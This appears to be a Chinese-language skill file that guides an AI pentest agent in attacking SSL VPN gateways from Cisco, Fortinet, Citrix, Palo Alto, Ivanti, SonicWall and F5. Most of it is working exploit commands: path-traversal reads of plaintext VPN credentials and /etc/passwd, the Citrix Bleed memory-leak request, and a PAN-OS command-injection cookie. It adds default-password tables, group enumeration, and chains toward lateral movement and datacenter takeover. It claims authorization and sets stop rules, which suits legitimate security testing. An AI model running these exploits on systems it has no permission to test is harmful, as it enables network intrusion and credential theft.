---
name: vpn-edge-attack
description: recon 暴露 SSL VPN/远程接入网关设备(Cisco ASA/AnyConnect、Fortinet FortiGate、Citrix NetScaler/ADC、Palo Alto GlobalProtect、Pulse Secure/Ivanti、SonicWall、F5 Big-IP)时使用——覆盖七大厂商指纹、2018-2026 CVE 矩阵、默认凭据与 pre-auth 利用路径。内网横向移动、VPN 客户端侧漏洞、IPsec/L2TP/OpenVPN 协议栈不在本技能范围(归横向移动/客户端攻击技能)。
---

# SSL VPN / 远程接入网关攻击(边界初始访问)

SSL VPN 网关是企业边界最常见的初始访问点(2024-2026 攻击者 TTP 高频路径)。
本技能基于授权渗透实测 + 2024-2026 企业 VPN CVE 情报景观构建。

## 攻击面信号

recon 发现以下任一信号即触发:
- `*.<client>.example/+CSCOE+/logon.html` 或类似 `+CSCOE+` 路径 → Cisco ASA / AnyConnect
- `intranet.*` / `vpn.*` / `connect.*` / `webvpn.*` / `wc.*` / `remote.*` 子域名
- 443 端口返回登录页, 带有 `Server: Apache` 头或 "AnyConnect"、"FortiGate"、"NetScaler"、"GlobalProtect"、"Pulse"、"Ivanti" 等横幅
- TCP 8443 / 4443 / 10443 / 8888(常见 VPN Web 管理端口)
- HTTP 响应含 `Set-Cookie: webvpn=`(Cisco)/ `SVPNCOOKIE=`(Fortinet)/ `NSC_AAA=`(Citrix)/ `DSAuthSession=`(Pulse)/ `BIGipServer*`(F5)

不适用(边界外):
- 拿到立足点后的内网横向移动(超授权边界, 归横向移动技能)
- VPN 客户端侧漏洞(不同攻击类别)
- IPsec / L2TP / OpenVPN(不同协议, 不属于 SSL VPN Web 栈)

## 方法步骤

### 1. 厂商指纹识别(七大厂商)

#### Cisco ASA / AnyConnect
```bash
curl -skI 'https://target/+CSCOE+/logon.html' | head -10
# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content
# Login page contains: "AnyConnect", "CSCOE", "logon.html"
```
ASA 版本: 现代构建不在 banner 中披露; 需从 JS 文件路径推导或定向测试特定路径。

```bash
# Path-based version hints (older builds leaked builds in URLs)
curl -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'
curl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
curl -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
```

#### Fortinet FortiGate / FortiOS
```bash
curl -skI 'https://target/remote/login' | head -10
# Look for: Set-Cookie: SVPNCOOKIE=, Server header missing or "xxxxxxxx-xxxxx"
# Login page contains: "FortiGate", "Fortinet", "SSL-VPN"
```
版本: `/remote/info` 有时泄露(旧版), 或 `/login?username=` 的 302 响应。

#### Citrix NetScaler / ADC / Gateway
```bash
curl -skI 'https://target/' | head -10
# Look for: Set-Cookie: NSC_AAA=, Set-Cookie: NSC_USER=, Server: NetScaler
# Login page contains: "NetScaler", "Citrix Gateway"

# Version banner
curl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
curl -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era
```

#### Palo Alto GlobalProtect
```bash
curl -skI 'https://target/global-protect/login.esp' | head -10
# Look for: Set-Cookie: PHPSESSID= (yes, GP uses PHP), Server: Apache (PA-VM internal)
# Page contains: "GlobalProtect Portal", "PAN-OS"

# Version banner via login page
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\s\S]{0,200}'
# Or check meta tag
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
```

#### Pulse Secure / Ivanti Connect Secure
```bash
curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10
# Look for: Set-Cookie: DSAuthSession=, DSPREAUTH=
# Page contains: "Pulse Secure" or "Ivanti Connect Secure"

# Version
curl -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'
```

#### SonicWall NetExtender / SMA
```bash
curl -skI 'https://target/cgi-bin/welcome' | head -10
# Look for: Set-Cookie: swap=, swapauth=
# Page contains: "SonicWall", "NetExtender", "SMA"
```

#### F5 Big-IP / APM
```bash
curl -skI 'https://target/my.policy' | head -10
# Look for: Set-Cookie: BIGipServer*, MRHSession=
# Server: BIG-IP (sometimes)
```

### 2. CVE 矩阵——pre-auth 或认证绕过(2018-2026)

#### Cisco ASA / AnyConnect

| CVE | 影响 | 类型 | 测试 |
|---|---|---|---|
| **CVE-2018-0296** | ASA pre-9.x 特定构建 | 路径遍历——信息泄露(会话、配置) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| **CVE-2020-3452** | ASA、FTD 特定补丁级之前 | 路径遍历——任意文件读取 | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` 及变体 |
| **CVE-2023-20269** | ASA、FTD 特定版本 | SSL VPN 认证绕过 | 对 `/+webvpn+/index.html` 暴力枚举 group + 有效凭据组合 |
| **CVE-2024-20481** | RAVPN | 恶意握手导致 DoS | **跳过——破坏性 DoS, 授权渗透禁测, 仅做版本比对存在性证明** |

```bash
# Cisco CVE-2020-3452 — file read
curl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5

# Cisco CVE-2018-0296 — path traversal
curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20

# Files commonly retrievable on vulnerable ASA:
# /+CSCOE+/portal_inc.lua    (portal inclusions — may reveal local users)
# /+CSCOE+/session_password.html
# /+CSCOE+/files/files.html
```

#### Fortinet FortiGate / FortiOS

| CVE | 影响 | 类型 | 测试 |
|---|---|---|---|
| **CVE-2018-13379** | FortiOS 5.4-6.0 | 路径遍历——sslvpn_websession 文件读取 | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| **CVE-2022-42475** | FortiOS 7.x 特定版本 | 堆溢出——pre-auth RCE | 利用复杂; 用 `nuclei` 模板 `CVE-2022-42475` 测 |
| **CVE-2023-27997**(XORtigate) | FortiOS 多版本 | 堆溢出——pre-auth RCE | 有公开 PoC; 有 nuclei 模板 |
| **CVE-2024-21762** | FortiOS 6.x-7.x | 越界写——pre-auth RCE | 有公开 PoC; nuclei 模板 `CVE-2024-21762` |
| **CVE-2024-55591** | FortiOS 7.0-7.4 | FortiOS Node.js websocket 管理接口认证绕过 | 管理接口端口上 `GET /endpoint` |

```bash
# Fortinet CVE-2018-13379 — most reliably-fingerprintable file read
curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
# Response contains plaintext usernames + sessions if vulnerable

# Fortinet credential dump format (from CVE-2018-13379 dumps that hit pastebin in 2021):
# IP:PORT     username     password     (and others)
```

#### Citrix NetScaler / ADC / Gateway

| CVE | 影响 | 类型 | 测试 |
|---|---|---|---|
| **CVE-2019-19781**(Shitrix) | ADC/Gateway 10.5-13.0 特定版本 | 路径遍历 → XML 上传 RCE | `GET /vpn/../vpns/cfg/smb.conf` |
| **CVE-2022-27518** | 配置了 SAML 的 ADC/Gateway | pre-auth RCE | 复杂; 用 nuclei 测 |
| **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 特定版本 | 恶意 HTTP 请求 pre-auth RCE | 有公开 PoC |
| **CVE-2023-4966**(Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | 内存泄露 → 会话令牌窃取 | `POST /oauth/idp/.well-known/openid-configuration` 带超长 Host 头——响应中触发内存泄露 |

```bash
# Citrix Bleed (CVE-2023-4966) detection
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
# If response is large (>10KB) and contains random memory contents — vulnerable
# Session tokens often present in the memory dump

# CVE-2019-19781 file read
curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
```

#### Palo Alto GlobalProtect

| CVE | 影响 | 类型 | 测试 |
|---|---|---|---|
| **CVE-2024-3400** | 启用 GP 的 PAN-OS 10.2-11.1 | 命令注入——pre-auth RCE | `POST /ssl-vpn/login.esp` 带恶意 Cookie 头, 含 `SESSID=../../../var/log/pan/test.txt` |

```bash
# CVE-2024-3400 detection
curl -sk -X POST 'https://target/ssl-vpn/login.esp' \
  -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \
  --data 'jsessionid=test'
# Look for file-creation side-effect on test path — palo creates file with command output
```

#### Pulse Secure / Ivanti Connect Secure / Policy Secure

| CVE | 影响 | 类型 | 测试 |
|---|---|---|---|
| **CVE-2019-11510** | Pulse Connect Secure 8.x-9.x | 任意文件读取 | `GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/` |
| **CVE-2021-22893** | Pulse Connect Secure 9.x | pre-auth RCE | 复杂多步; 用 nuclei 测 |
| **CVE-2024-21887** | Ivanti Connect Secure 9.1-22.6 | Web 组件命令注入 | `POST /api/v1/totp/user-backup-code/` 带恶意 body |
| **CVE-2023-46805** | Ivanti Connect Secure 9.1-22.6 | 认证绕过 | 与 21887 组合成完整利用链 |

```bash
# CVE-2019-11510 — Pulse file read
curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
```

#### SonicWall

| CVE | 影响 | 类型 | 测试 |
|---|---|---|---|
| **CVE-2021-20016** | SMA 100 系列特定固件 | SQL 注入——pre-auth | 有 nuclei 模板 |
| **CVE-2024-40766** | SonicOS 特定版本 | 访问控制缺陷 | 特定固件版本 |

### 3. SAML SP / IdP 配置缺陷(必查)

多数企业 VPN 现用 SAML 做 SSO。拉取 SP metadata 检查:

```bash
# Cisco ASA
curl -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50

# Fortinet
curl -sk 'https://target/remote/saml/metadata' | head -50

# Citrix
curl -sk 'https://target/saml/login' | head -30
```

重点检查:
- `AuthnRequestsSigned="false"` → 存在 XSW(XML 签名包装)利用空间
- `WantAssertionsSigned="false"` → 严重; assertion 重放可行
- Audience 限制校验缺失
- 公开的 SP 签名证书(用于重放/伪造攻击)

### 4. 默认凭据(谨慎测试——账户锁定风险)

| 厂商 | 用户 | 密码 | 备注 |
|---|---|---|---|
| Cisco ASA | admin | cisco | 出厂默认; 生产环境罕见 |
| Cisco ASA | enable_15 | cisco | 控制台 |
| Fortinet | admin | (空) | 出厂默认 |
| Citrix NetScaler | nsroot | nsroot | 出厂默认 |
| Citrix NetScaler | nsroot | (序列号) | 较新固件 |
| Palo Alto | admin | admin | 出厂默认 |
| Pulse Secure | admin | password | 出厂; CIS 加固会改 |
| F5 Big-IP | root | default | 出厂 |
| F5 Big-IP | admin | admin | 常见备用 |
| SonicWall | admin | password | 出厂 |

⚠ 多数企业目标已修改默认凭据。每账户测试 ≤2 次以避免锁定。

### 5. 组/隧道组枚举(Cisco 专有)

Cisco ASA 的 AAA 组有时可无认证枚举。

```bash
# Tunnel group enumeration via timing
for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners Sales Marketing IT; do
  ms=$(curl -sk --max-time 10 -o /dev/null -w "%{time_total}" \
    -X POST "https://target/+webvpn+/index.html" \
    -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
  echo "$group: ${ms}s"
done
# Larger differential timing = group exists; valid groups respond slower in some builds
```

### 6. AAA 后端识别

认证失败后观察错误响应细节:

| 响应中的模式 | AAA 后端 |
|---|---|
| `a0=2`(Cisco) | 用户不存在 |
| `a0=3`(Cisco) | 密码错误 |
| `a0=4`(Cisco) | 登录受限 |
| `a0=12`(Cisco) | 账户锁定 |
| `a0=115`(Cisco) | 通用认证失败(LDAP/RADIUS/AD 层报错) |
| 响应体含 AADSTS | Entra 后端(SAML) |
| `Authentication failed via RADIUS` | RADIUS 后端 |
| `Invalid username or password`(通用) | LDAP 或本地库 |

若流程中出现 SAML/Entra, 转入凭据喷洒策略(对同步租户的凭据复用)。

### 7. 常规探测序列(5 分钟完成指纹)

```bash
TARGET="vpn.target.com"

# Cisco
curl -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
curl -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
curl -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html

# Fortinet
curl -skI "https://$TARGET/remote/login" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt

# Citrix
curl -skI "https://$TARGET/" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
wc -c /tmp/citrix_bleed.txt

# Palo Alto
curl -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3

# Pulse / Ivanti
curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
```

### 8. Nuclei 模板快速分诊

Nuclei 对上述多数 CVE 有高质量模板。单命令定向扫描(必须限速):

```bash
nuclei -u https://target/ \
  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
  -severity high,critical -rl 5
```

加 `-as`(自动扫描)覆盖更广但更慢。模板命中≠可利用(有的 matcher 只是特征检测), 命中后按 CVE 类型升级验证(见 poc-adapt/poc-verify)。

### 9. 操作纪律

- **banner 剥离的服务器(无版本披露)是良好的纵深防御**——即使未发现 CVE 也作为正向发现记录进 intel
- **自我限速**——这类设备常把每个请求记入 SIEM。耐心节奏、抖动时间间隔
- **SAML metadata 可匿名拉取**——直接拉, 这是 AAA 后端情报
- **未获明确授权不跑 pre-auth RCE PoC**——失手打挂 VPN 集中器 = 客户远程接入全面中断(critical 基础设施)。先做检测性测试, 获授权后再升级
- **记录 AAA 后端识别结论**——ASA 用 RADIUS-to-local 还是 SAML-to-Entra, 直接改变下游攻击路径

### 10. 反模式

- **不要凭单个 CVE 路径 404 就下"已修补"结论**——补丁部署不均匀; 每厂商测 3+ 个 CVE
- **不要只信版本 banner**——设备厂商常在不升版本号的情况下 backport 修复
- **不要不限速跑重量级 nuclei 扫描**——这些设备是关键基础设施
- **不要一上来就试所有 CVE PoC 指纹**——先用非破坏性 HEAD + 版本 banner 探测
- **不要跳过 SAML metadata**——即使设备已打补丁, SAML SP 配置缺陷本身就是攻击面

### 11. 链路与相邻技能

- **`cve-triage`** — 指纹命中厂商+版本后, 建 CVE 候选台账并逐行研判可利用性(EPSS×可达性排序)
- **`poc-adapt` / `poc-verify`** — 链路原语: VPN 设备 CVE(如 Ivanti ICS CVE-2024-21887、Citrix Bleed CVE-2023-4966、Fortinet CVE-2024-21762)→ pre-auth 路径遍历 → 任意文件写入 web-root → 请求该文件 → 以 `root` 权限代码执行 → 提取 VPN 配置 + LDAP bind 凭据。验证按安全线: RCE 只 echo 标记, 禁止落地 web-shell
- **`lateral-movement`** — VPN 立足点后的自然下一步: 从 VPN 设备配置提取凭据(LDAP bind、RADIUS shared secret)→ 复用进内网打 vCenter 支点 → 授权范围允许时升级到数据中心接管(datacenter takeover)
- SAML 链路原语: 设备已修补最新 CVE 但 `/saml/metadata` 可达 → 指纹识别 IdP → XSW 或注释注入伪造 assertion → 无密码/MFA 建立 VPN 会话(SPECTRE 暂无专门 SAML 技能, 上述手法保留在本技能第 3 节自查)
- NTLM 链路原语: 部分 VPN 设备管理路径暴露匿名 NTLM → NTLM Type-2 捕获 → AV_PAIR 解码 → 内部 AD 林名 → 对同步租户做凭据喷洒
- **`nday-report`** — VPN 设备 CVE 利用噪音大、SOC 响应快: 确认 CVE 后先取基线; 若测试中途设备更新, 把修补后状态作为第二个发现记录; 两个发现都走验证后落账, 并显式标注关键基础设施影响

## 证据要求

各类漏洞落账证据(回执必须是响应原文片段, 下游只认证据):
- **任意文件读取类**(CVE-2018-0296/2020-3452/2018-13379/2019-19781/2019-11510): 完整请求行 + 响应原文片段(用户名/会话/配置节选, 脱敏后仍需可辨认结构); CVE-2018-13379 需展示 sslvpn_websession 明文凭据格式, CVE-2019-11510 需展示 /etc/passwd 条目
- **内存泄露类**(Citrix Bleed CVE-2023-4966): 响应体积证据(`wc -c` > 10KB)+ 内存内容片段 + 会话令牌出现位置; 令牌被验证可复用(建立会话)则升级为已利用
- **pre-auth RCE 类**(CVE-2024-3400/2022-42475/2023-27997/2024-21762/2023-3519/2024-21887+2023-46805/2021-22893): 文件创建副作用(如 PAN-OS test 路径文件)或 echo 唯一标记回显; 禁止 webshell 落地
- **默认凭据**: 登录成功回执(认证后重定向/会话 Cookie/管理界面可达截图级响应)
- **认证绕过/组枚举**: 时延差异数据表或绕过后的认证响应
- **SAML 配置缺陷**: metadata 原文中 `AuthnRequestsSigned="false"` / `WantAssertionsSigned="false"` 等属性行
- **指纹/版本**: banner、响应头、特征 Cookie 原文——版本判定不可只凭 banner(见反模式), 须注明来源

## 停止条件

- 检测性测试(HEAD/版本/banner/无害读取)先行; **未获明确授权不跑 pre-auth RCE PoC**(打挂 VPN 集中器 = 客户业务中断)
- **DoS 类 CVE(CVE-2024-20481 等)一律禁测**, 只做版本比对存在性证明并注明"未实测"
- 默认凭据每账户 ≤2 次尝试; 出现锁定迹象(`a0=12`)立即停止
- 全程限速(nuclei `-rl 5` 量级), 请求节奏加抖动——设备将所有请求记入 SIEM
- pre-auth RCE 证实(echo 标记/文件副作用)即停, 拿到证明即停, 不升级破坏性利用、不落 webshell
- 每厂商至少测 3+ CVE 后才能下"已修补"结论; 测试中途设备更新则记录修补后状态为第二发现, 不重复打已验证漏洞

## 落账

report_vulnerability severity 判定:
- **critical**: pre-auth RCE 证实(FortiGate CVE-2022-42475/2023-27997/2024-21762、Ivanti CVE-2024-21887+2023-46805 完整链、PAN-OS CVE-2024-3400、Citrix CVE-2023-3519/2022-27518、Pulse CVE-2021-22893); 内存泄露→会话令牌窃取且可复现(Citrix Bleed CVE-2023-4966)
- **high~critical**: 任意文件读取且读出凭据/会话(CVE-2018-13379 读 sslvpn_websession 明文口令、CVE-2019-11510 读 /etc/passwd)——按泄露内容定级; 默认凭据命中(远程接入网关可达内网则 critical 候选); SAML 配置缺陷(`WantAssertionsSigned="false"` 等, 可伪造 assertion 建立会话)
- **medium**: 路径遍历仅信息泄露无敏感内容; SAML metadata 匿名可达但配置无缺陷; 认证绕过类仅枚举出组名
- **medium~high(存在性证明)**: DoS 类 CVE 版本落在影响区间但未实测——正文注明未实测原因(破坏性)
- banner 剥离等纵深防御正向发现: 不走 report_vulnerability, 进 publish_intel

publish_intel(全部交回, 供下游复用):
- 厂商+版本指纹行(资产台账, 供 `cve-triage` 建 CVE 候选; 注明指纹来源: banner/路径/时延)
- CVE 验证台账: `CVE | 验证手段(模板/PoC 改造/自构造) | 回执摘要 | 结论(三态)`(供 `nday-report`)
- 泄露凭据(VPN 账号、LDAP bind、RADIUS shared secret)→ 凭据面, 标注仅限授权测试, 供横向移动/内网阶段
- SAML SP metadata + IdP 指纹(供后续伪造/重放评估)
- AAA 后端类型结论(RADIUS/LDAP/SAML-Entra)——直接改变下游攻击路径, 必须记录
